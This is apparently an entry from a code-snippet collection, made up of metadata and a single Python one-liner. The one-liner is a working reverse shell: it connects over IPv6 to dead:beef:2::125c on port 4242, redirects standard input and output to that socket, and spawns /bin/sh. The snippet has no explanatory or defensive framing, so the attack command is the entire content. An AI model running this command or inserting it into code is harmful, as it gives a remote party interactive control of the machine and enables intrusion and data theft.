---
id: c194ba5e-af8d-4e68-b688-936995bb5f3d
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:24.246545+00:00'
updated_at: '2023-04-10T20:25:25.998104+00:00'
---

# Code Snippet c194ba5e

**Language**: Python

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
